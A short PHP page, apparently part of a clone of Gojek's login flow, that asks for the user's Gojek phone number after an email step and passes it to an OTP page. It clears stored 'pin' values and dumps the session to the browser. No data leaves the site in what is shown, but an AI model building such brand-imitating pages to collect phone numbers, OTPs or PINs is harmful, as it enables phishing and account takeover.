<?php
session_start();
require_once '../config.php';
if (isset($_SESSION['telp'])) {
	unset($_SESSION['telp']);
}
if (isset($_SESSION['pin'])) {
	unset($_SESSION['pin']);
}
if (isset($_POST['email'])) {
	$_SESSION['email'] = $_POST['email'];
	var_dump($_SESSION);
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	 <link href="<?=BASEURL;?>css/bootstrap.css" rel="stylesheet">
	<title>Masukkan Nomor HP</title>
</head>
<body>
	<div class="container">
		<a href="./email.php">Kembali</a>
		<h2>Yuk, kita mulai</h2>
		<p>Masukin no. HP kamu yang dipake di Gojek. Atau, daftar sekarang kalau belum ada akun.</p>
		<form action="./otp.php" method="post">
			<label for="telp">Nomor HP</label><br>
			<span>+62 </span><input type="text" id="telp" name="telp">
			<button type="submit">Lanjut</button>
		</form>
	</div>
	<script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.8/dist/umd/popper.min.js" integrity="sha384-I7E8VVD/ismYTF4hNIPjVp/Zjvgyol6VFvRkX/vR+Vc4jQkC+hVqc2pM8ODewa9r" crossorigin="anonymous"></script>
    <script src="<?=BASEURL?>js/bootstrap.js"></script>
    <script src="<?=BASEURL?>js/script.js"></script>
    <script>
    if ( window.history.replaceState ) {
        window.history.replaceState( null, null, window.location.href );
    }
	</script>
</body>
</html>